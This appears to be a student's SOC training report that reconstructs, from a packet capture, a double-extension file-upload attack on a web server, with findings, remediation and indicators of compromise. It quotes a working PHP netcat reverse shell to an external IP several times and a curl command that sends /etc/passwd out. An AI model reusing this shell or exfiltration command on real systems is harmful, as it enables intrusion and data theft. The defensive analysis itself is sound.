# SOC Incident Simulation - Operation Shadow Drop

## Unrestricted File Upload and Data Exfiltration (NetSysLink Web Server)


## 1. Engagement Overview

A forensic investigation was conducted on a provided packet capture file
capturing a confirmed security breach against the NetSysLink production web
server (`24.49.63.79`, `shoporoma.com`). The incident was detected on
**30 November 2023** beginning at 18:43 UTC. An external threat actor from
IP `117.11.88.124` (Tianjin, China, ASN 4837, China Unicom Tianjin Province
Network) bypassed file upload restrictions by using a double extension filename
(`image.jpg.php`) to upload a PHP reverse shell. The attacker established an
interactive terminal session via the shell, ran system reconnaissance commands,
and exfiltrated `/etc/passwd` by posting it to attacker-controlled
infrastructure over port 443 to blend with normal HTTPS traffic. Analysis was
performed in Wireshark using conversation statistics, HTTP stream filtering, and
TCP stream reconstruction. Geolocation was confirmed via IP lookup at
`whatsmyipaddress.com`.

---

## 2. Objectives

- Identify the attacker's IP address and geographic origin from PCAP
  conversation statistics
- Determine the User-Agent string used and assess whether it represents a
  real browser or a spoofed string intended to evade WAF detection
- Identify the malicious web shell filename, confirm the double extension
  bypass technique, and extract the payload content
- Locate the server directory used to store uploaded files
- Identify the outbound port used by the web shell for reverse shell
  communication
- Determine what file was targeted for exfiltration and confirm the exfiltration
  method used to evade firewall egress filtering
- Document specific remediation controls to close the confirmed attack vectors

---

## 3. Scope

**In-Scope:**
- Provided PCAP file capturing all traffic between `117.11.88.124` and
  `24.49.63.79`
- Web application upload endpoint: `/reviews/upload.php`
- Upload directory: `/reviews/uploads/`
- Web shell stored at: `/reviews/uploads/image.jpg.php`
- Reverse shell outbound traffic on TCP port 8080
- Exfiltration traffic on TCP port 443

**Out-of-Scope:**
- Internal network traffic beyond the perimeter web server
- Database server traffic
- Any live system access or active exploitation

**Authorization Statement:**
> This investigation was conducted on a pre-captured PCAP file provided as part
> of a SOC simulation exercise for the course Network Security Operations at
> ICDFA. No live systems were accessed or exploited at any point. All analysis
> was performed in a controlled lab environment for educational purposes under
> authorized course instruction.

---

## 4. Methodology

### Phase 1: IP Attribution and Geolocation
Wireshark's Statistics > Conversations tab was opened. The PCAP contained
traffic between only two IP addresses: `24.49.63.79` and `117.11.88.124`.
Responses originated from `24.49.63.79`, confirming it as the web server.
Requests originated from `117.11.88.124`, confirming it as the attacker's
address. Geolocation was verified via `whatsmyipaddress.com`, returning
Tianjin, China (ASN 4837, China Unicom Tianjin Province Network, hostname
`dns124.online.tj.cn`).

### Phase 2: User-Agent Identification
The Wireshark display filter `http.user_agent` was applied. All HTTP requests
from `117.11.88.124` were inspected for the User-Agent header value. A
consistent User-Agent string was observed across all attacker requests,
indicating either a Linux desktop environment or a spoofed browser string
applied by an automated tool to evade WAF signature matching.

### Phase 3: Web Shell Upload Analysis
The display filter `http.request.method == "POST"` was applied to isolate
file upload requests. Two POST packets were identified. The first contained
a file named `image.php` and the server returned "Invalid file format." The
second contained a file named `image.jpg.php` and the server returned
"File uploaded successfully." The TCP stream for the successful upload was
followed to extract the full request including the PHP payload embedded in
the file body.

### Phase 4: Upload Directory Identification
The display filter `http.request.method == "GET"` was applied after the upload
event timestamp. GET requests in the packets following the upload revealed
the attacker attempting to trigger the web shell via a direct HTTP GET to
`/reviews/uploads/image.jpg.php`, confirming the upload directory as
`/reviews/uploads/`.

### Phase 5: Outbound Communication Analysis
The web shell payload content was extracted from the upload stream and
inspected. The PHP `system()` call embedded a Netcat reverse shell command
instructing the server to initiate an outbound TCP connection to
`117.11.88.124` on port `8080`. The filter `tcp.port == 8080` was applied
to isolate this traffic and the TCP streams were followed to confirm the
reverse shell session and identify commands executed.

### Phase 6: Exfiltration Method Analysis
TCP streams on port 8080 were followed to reconstruct the attacker's
interactive shell session. The commands revealed the attacker used `curl`
to POST the `/etc/passwd` file to a web address hosted on the attacker's
own IP using port 443. Port 443 was selected to disguise the exfiltration
as standard HTTPS traffic, which most firewalls allow outbound by default.

---

## 5. Vulnerability Summary

| ID | Vulnerability | Severity | Affected Endpoint |
|----|--------------|----------|-------------------|
| 01 | Unrestricted File Upload: Double Extension Bypass | Critical | /reviews/upload.php |
| 02 | Web Shell Remote Code Execution | Critical | /reviews/uploads/image.jpg.php |
| 03 | Data Exfiltration via curl over Port 443 | Critical | Server filesystem: /etc/passwd |
| 04 | Upload Directory Web-Accessible with Script Execution Enabled | Critical | /reviews/uploads/ |
| 05 | No Egress Filtering on Outbound TCP Port 8080 | High | Server network configuration |
| 06 | Server Version Disclosure via HTTP Response Headers | Medium | All HTTP responses |

---

## 6. Detailed Findings

---

### Finding 01: Unrestricted File Upload via Double Extension Bypass

#### Severity
Critical

#### Affected Endpoint
`/reviews/upload.php`: POST, `uploadedFile` field

#### Description
The file upload endpoint on `shoporoma.com` applied a filter to reject files
with executable extensions. When the attacker uploaded `image.php`, the server
returned "Invalid file format," confirming the filter checked the terminal
extension. However, the filter did not account for double extension filenames.
When the attacker resubmitted the same PHP payload under the filename
`image.jpg.php`, the server identified only the `.jpg` portion and accepted
the file, returning "File uploaded successfully." The terminal extension
`.php` was not evaluated. The PHP payload was stored in `/reviews/uploads/`
and remained directly executable via HTTP GET.

#### Proof of Concept

Second upload attempt with `image.jpg.php`: accepted by the server:

![Wireshark - Second POST Upload of image.jpg.php Accepted with File uploaded successfully](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/49_01%20Wireshark%20-%20Second%20POST%20Upload%20of%20image.jpg.php%20Accepted%20with%20File%20uploaded%20successfully.jpg)



Successful upload request extracted from the TCP stream:
```

Content-Disposition: form-data; name="uploadedFile"; filename="image.jpg.php"
Content-Type: application/x-php

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
117.11.88.124 8080 >/tmp/f"); ?>

HTTP/1.1 200 OK
Date: Thu, 30 Nov 2023 18:44:19 GMT
Server: Apache/2.4.52 (Ubuntu)
...
File uploaded successfully
```

#### Impact
The uploaded PHP file was stored in a web-accessible directory with PHP
execution enabled. Any HTTP GET request to the file URL triggered the PHP
payload, initiating a reverse shell back to the attacker. The upload validation
logic evaluated the filename string rather than the actual file content. This
means any double extension, triple extension, or alternate PHP extension
(`.phtml`, `.phar`, `.php5`) bypasses the same filter with equal ease.

#### Remediation
- Reject any file where the extracted terminal extension is an executable type.
The validation logic must evaluate the last extension after the final dot, not
the first extension or the presence of a permitted extension anywhere in the
filename.
- Additionally, validate file content using magic byte inspection via
`finfo_file()` rather than trusting the filename or client-supplied
`Content-Type` header

---

### Finding 02: Web Shell Remote Code Execution

#### Severity
Critical

#### Affected Endpoint
`/reviews/uploads/image.jpg.php`: HTTP GET

#### Description
The uploaded file `image.jpg.php` contained a PHP reverse shell one-liner.
When the attacker sent a GET request to the stored file's path, the PHP
interpreter executed the payload. The payload created a named pipe at
`/tmp/f`, attached `/bin/sh` to it, and piped shell input and output through
a Netcat connection back to `117.11.88.124:8080`. The server initiated the
outbound connection, bypassing inbound firewall rules. The attacker received
a fully interactive shell session running under the web server process
account.

#### Proof of Concept

Web shell payload content from the upload stream:
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
117.11.88.124 8080 >/tmp/f"); ?>
```

TCP stream on port 8080 reconstructing the interactive shell session with
attacker commands visible:


![Wireshark TCP Stream Port 8080 - Interactive Shell Commands: whoami, uname -a, pwd, cat /etc/passwd](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/49_02%20Wireshark%20TCP%20Stream%20Port%208080%20-%20Interactive%20Shell%20Commands%20curl%20etc-passwd.jpg)



Commands executed within the reverse shell session:
```
whoami
uname -a
pwd
cat /etc/passwd
```

#### Impact
An interactive reverse shell running under the web server process account
provides the attacker with persistent remote access without re-exploiting
the upload vulnerability. The attacker can read all files accessible to the
web server process, execute further commands, and use the compromised server
as a pivot point into the internal network. The shell persists until the
file is removed from disk and active TCP connections are terminated.

#### Remediation
- Remove `image.jpg.php` from `/reviews/uploads/` immediately. Audit the full
upload directory for any other files created during the same session. Disable
PHP execution in the upload directory using `.htaccess`
- Store uploaded files outside the web root to prevent HTTP access to stored
files entirely. Implement file integrity monitoring (FIM) on the upload
directory to alert on any new file creation, particularly PHP files.

---

### Finding 03: /etc/passwd Exfiltrated via curl over Port 443

#### Severity
Critical

#### Affected Component
Server filesystem: `/etc/passwd`, exfiltrated to attacker infrastructure

#### Description
During the reverse shell session, the attacker ran `cat /etc/passwd` to
read local user account information. The attacker then used `curl` to POST
the `/etc/passwd` file to a web address hosted on their own IP address
(`117.11.88.124`) using port 443. Port 443 was chosen deliberately to
disguise the exfiltration as standard HTTPS traffic. Most perimeter firewalls
permit outbound TCP 443 without inspection, making it a reliable exfiltration
channel that bypasses common egress filters.

#### Proof of Concept

TCP stream on port 8080 showing the attacker running `cat /etc/passwd`
and the `/etc/passwd` content returning through the shell session:



![Wireshark TCP Stream - cat /etc/passwd Command and Response Including User Account Lines](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/49_02%20Wireshark%20TCP%20Stream%20Port%208080%20-%20Interactive%20Shell%20Commands%20curl%20etc-passwd.jpg)



Exfiltration command observed in the TCP stream:
```
curl -X POST -d /etc/passwd http://117.11.88.124:443/
```

Partial `/etc/passwd` content observed in the stream:
```
gnome-initial-setup:x:126:65534::/run/gnome-initial-setup:/bin/false
hplip:x:127:7:HPLIP system user,,,:/run/hplip:/bin/false
gdm:x:128:134:Gnome Display Manager:/var/lib/gdm3:/bin/false
ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
```

curl transfer statistics confirming the POST completed:
```
% Total    % Received  % Xferd  Average Speed  Time     Time     Time  Current
                                 Dload   Upload  Total    Spent    Left   Speed
100  368  100  357  100  11  56774   17[393 bytes missing in capture file].$
```

#### Impact
The `/etc/passwd` file contains all local user accounts on the system, their
UIDs, GIDs, home directories, and shell assignments. The `ubuntu` user
confirmed in the listing is the likely administrative account with sudo
access. This information provides the attacker with a complete user enumeration
and a target list for offline password attacks against the shadow file or
for SSH brute force attempts against known valid usernames. The use of port
443 for exfiltration confirms intentional firewall evasion, indicating the
attacker had prior knowledge of the network's egress filtering configuration.

#### Remediation
- Implement egress filtering on the web server that restricts outbound
connections to explicitly permitted destinations and ports only. The web
server process account (`www-data`) should not be permitted to initiate
outbound connections to arbitrary external IP addresses on any port,
including 443. A host-based firewall rule restricting outbound traffic from
the Apache process can be applied using `iptables` with UID-based filtering
- Monitor outbound connections from the web server for anomalies such as
connections to non-whitelisted external IPs, particularly on ports 443 and
8080 from a web server process.

---

### Finding 04: Upload Directory Web-Accessible with Script Execution Enabled

#### Severity
Critical

#### Affected Component
`/reviews/uploads/`: Web-accessible directory, PHP execution permitted

#### Description
The directory where the web application stores uploaded files is directly
accessible via HTTP and the web server executes PHP files stored within it.
This was confirmed by the attacker's successful GET request to
`/reviews/uploads/image.jpg.php` triggering PHP execution. The upload
directory was also identified through the `Referer` header in the attacker's
requests, which showed `http://shoporoma.com/reviews/uploads/`, and through
the GET request path following the successful upload.

#### Proof of Concept

GET request to the web shell path confirming the upload directory is
web-accessible and PHP execution is active:



![Wireshark - GET /reviews/uploads/image.jpg.php Returning PHP Execution Output](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/49_03%20Wireshark%20-%20GET%20reviews-uploads-image.jpg.php%20Returning%20PHP%20Execution%20Output.jpg)



Upload directory confirmed from attacker GET request:
```
GET /reviews/uploads/image.jpg.php HTTP/1.1
Host: shoporoma.com
Referer: http://shoporoma.com/reviews/uploads/
```

#### Impact
A web-accessible upload directory with PHP execution enabled means any PHP
file that reaches the directory, regardless of the bypass technique used to
get it there, becomes immediately executable. This is the condition that
converts a file upload vulnerability into remote code execution. Removing
this condition at the infrastructure level limits the impact of any upload
bypass that may be found in the future.

#### Remediation
- Store uploaded files in a directory outside the web root that cannot be
accessed via HTTP. If files must remain inside the web root (for example,
to serve uploaded images to visitors), add an `.htaccess` file in the
uploads directory that disables all script execution
- Rename all uploaded files server-side to randomly generated strings with a
forced safe extension (e.g., a UUID with `.jpg`), removing the original
filename from the stored path entirely.

---

### Finding 05: No Egress Filtering on TCP Port 8080

#### Severity
High

#### Affected Component
Server network configuration: outbound TCP port 8080

#### Description
The web server was permitted to initiate outbound TCP connections to
arbitrary external IP addresses on port 8080. The reverse shell payload
in `image.jpg.php` used Netcat to connect back to `117.11.88.124:8080`.
This connection succeeded, confirming no egress rule blocked outbound
traffic from the server on this port. Port 8080 is commonly left open in
firewall configurations that focus on inbound rules. The attacker's choice
of port 8080 for the reverse shell and port 443 for exfiltration both
reflect deliberate selection of ports that commonly pass outbound without
inspection.

#### Proof of Concept

Web shell payload specifying port 8080 as the outbound connection target:
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
117.11.88.124 8080 >/tmp/f"); ?>
```

Wireshark TCP stream on port 8080 confirming the connection was established
and interactive shell commands were exchanged:



![Wireshark - TCP Port 8080 Stream Confirming Reverse Shell Session Established](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%20II/Screenshots/49_04%20Wireshark%20-%20TCP%20Port%208080%20Stream%20Confirming%20Reverse%20Shell%20Session%20Established.jpg)



#### Impact
Without egress filtering, any code executing on the web server can initiate
outbound connections to attacker-controlled infrastructure on any port. The
reverse shell relied entirely on this outbound connection being allowed. A
firewall rule blocking unexpected outbound TCP connections from the web
server's IP would have prevented the shell from establishing even after the
file was uploaded and triggered.

#### Remediation
- Configure a host-based firewall on the web server using `iptables` or
`ufw` to permit outbound traffic only to explicitly needed destinations
and ports (typically ports 80, 443, and 53 to defined upstream addresses).
Block all other outbound connections by default
- Implement network-level egress filtering at the perimeter to enforce the
same policy from outside the host.

---

### Finding 06: Server Version Disclosure via HTTP Response Headers

#### Severity
Medium

#### Affected Component
HTTP response headers: all responses from `shoporoma.com`

#### Description
Every HTTP response from the server included the `Server` header identifying
the exact Apache version: `Apache/2.4.52 (Ubuntu)`. This was visible across
all response packets captured in the PCAP. Apache 2.4.52 was released in
December 2021 and has known CVEs available in public vulnerability databases.

#### Proof of Concept

Server header observed in the upload confirmation response:
```
HTTP/1.1 200 OK
Date: Thu, 30 Nov 2023 18:44:19 GMT
Server: Apache/2.4.52 (Ubuntu)
```

#### Impact
Knowing the exact server version allows an attacker to query the NVD and
Exploit-DB for version-specific exploits without any active fingerprinting
effort, reducing the reconnaissance burden before targeting the server.

#### Remediation
Add the following to the Apache configuration to suppress version disclosure:
```
ServerTokens Prod
ServerSignature Off
```
Update Apache to the current supported stable release.

---

## 7. Attack Timeline

| Timestamp (UTC) | Phase | Action | Evidence |
|-----------------|-------|--------|----------|
| 30 Nov 2023 18:43:30 | Initial Connection | Attacker `117.11.88.124` initiates connection to server `24.49.63.79` | TCP handshake in PCAP |
| 30 Nov 2023 18:43:57 | First Upload Attempt | `image.php` uploaded via POST, rejected: "Invalid file format" | HTTP POST response |
| 30 Nov 2023 18:44:19 | Second Upload Attempt | `image.jpg.php` uploaded via POST, accepted: "File uploaded successfully" | HTTP 200, upload confirmation |
| 30 Nov 2023 18:44:52 | Web Shell Triggered | GET request to `/reviews/uploads/image.jpg.php` executes PHP payload | HTTP GET, TCP port 8080 session opens |
| Post-18:44:52 | Reconnaissance | Attacker runs `whoami`, `uname -a`, `pwd` in interactive shell | TCP stream port 8080 |
| Post-18:44:52 | Data Access | `cat /etc/passwd` executed, local account list read | TCP stream port 8080 |
| Post-18:44:52 | Exfiltration | `curl -X POST -d /etc/passwd http://117.11.88.124:443/` transfers file | TCP stream port 443 |

---

## 8. Indicators of Compromise (IOCs)

**Network-Based IOCs**

| Indicator | Value | Description |
|-----------|-------|-------------|
| Attacker IP | `117.11.88.124` | Source of all malicious traffic |
| Geographic Origin | Tianjin, China (ASN 4837, China Unicom Tianjin) | GeoIP attribution |
| Hostname | `dns124.online.tj.cn` | Reverse DNS for attacker IP |
| User-Agent | `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0` | All attacker HTTP requests |
| Reverse Shell Port | TCP 8080 | Outbound shell connection |
| Exfiltration Port | TCP 443 | Exfiltration disguised as HTTPS |
| Upload Endpoint | `/reviews/upload.php` | POST target for shell upload |
| Shell URL | `/reviews/uploads/image.jpg.php` | Uploaded shell access path |

**Host-Based IOCs**

| Indicator | Value | Description |
|-----------|-------|-------------|
| Malicious Filename | `image.jpg.php` | Double extension PHP reverse shell |
| Upload Directory | `/reviews/uploads/` | Storage path for uploaded files |
| Shell Payload | `<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>` | Reverse shell content |
| Exfiltrated File | `/etc/passwd` | Local user account file exfiltrated via curl |
| Server Version | `Apache/2.4.52 (Ubuntu)` | Disclosed in response headers |

---

## 9. Challenges Encountered

- **IP attribution from a two-address PCAP:** The PCAP contained only two IP
  addresses, which simplified attribution significantly compared to a high-volume
  production capture. In a real environment, the same analysis would require
  filtering a much larger conversation list to isolate the malicious session.
  The approach of identifying which IP sent requests versus which sent responses
  is the correct methodology regardless of capture size.
- **Port 443 exfiltration creates ambiguity with legitimate HTTPS traffic:**
  The attacker's use of port 443 for exfiltration is specifically designed to
  blend with normal HTTPS traffic. In a production environment without deep
  packet inspection or SSL inspection, this traffic would appear identical to
  legitimate outbound HTTPS connections. Identifying it required following the
  TCP stream from the port 8080 reverse shell session to observe the curl
  command before filtering on 443 to find the data transfer.
- **Double extension bypass confirmed the filter's blind spot:** The sequence
  of a rejected `image.php` followed immediately by an accepted `image.jpg.php`
  made the bypass technique immediately clear from the PCAP. In a more hardened
  environment where both uploads were rejected, the investigator would need
  to look for other bypass techniques such as null bytes, case variation, or
  alternate PHP extensions.

---

## 10. Key Takeaways

- **Double extensions exploit the assumption that only the first extension
  matters:** The upload filter checked whether the filename contained `.jpg`
  and found it. It never checked whether the terminal extension was `.php`.
  Evaluating `pathinfo($filename, PATHINFO_EXTENSION)` returns only the last
  extension, which is what the browser and PHP interpreter use. Validation
  must check the last extension, not the presence of a safe extension anywhere
  in the string.
- **Egress filtering at port 8080 would have broken the kill chain at
  exploitation:** The file was uploaded successfully. The PHP payload executed.
  But the reverse shell only established because the server could freely connect
  outbound to port 8080. A single firewall rule blocking non-standard outbound
  ports from the server would have left the attacker with an uploaded file they
  could not trigger into a working session.
- **Port 443 exfiltration exploits the default trust given to HTTPS traffic:**
  The attacker sent `/etc/passwd` outbound over port 443. Without SSL inspection
  or anomaly-based detection, this looks identical to a normal HTTPS request.
  Egress filtering must go beyond blocking non-standard ports. Destination-based
  allowlisting, permitting port 443 only to known CDN, update, and API
  endpoints removes this evasion technique.
- **The upload directory's executability is the real enabler:** Two separate
  controls failed to prevent this attack: the upload filter and the execution
  configuration. Even if both were independently exploitable, fixing only one
  limits the attacker to file storage without execution. Disabling PHP execution
  in the upload directory with `php_flag engine off` would have prevented the
  reverse shell regardless of what file the attacker managed to upload.
- **A failed upload immediately followed by a successful one is a detectable
  signal:** "Invalid file format" at 18:43:57, then "File uploaded successfully"
  at 18:44:19, a 22-second gap. A SIEM rule alerting on a failed upload
  immediately followed by a successful upload from the same source IP would
  have flagged this sequence for human review before the shell was triggered.

---

## 11. Disclaimer

> This investigation was conducted on a pre-captured PCAP file provided as part
> of a SOC incident simulation exercise for the course Network Security
> Operations at ICDFA. No live systems were accessed, exploited, or disrupted
> at any point during this investigation. All findings are based solely on
> evidence present in the provided capture file. All techniques and indicators
> documented in this report are presented for educational and defensive awareness
> purposes only.
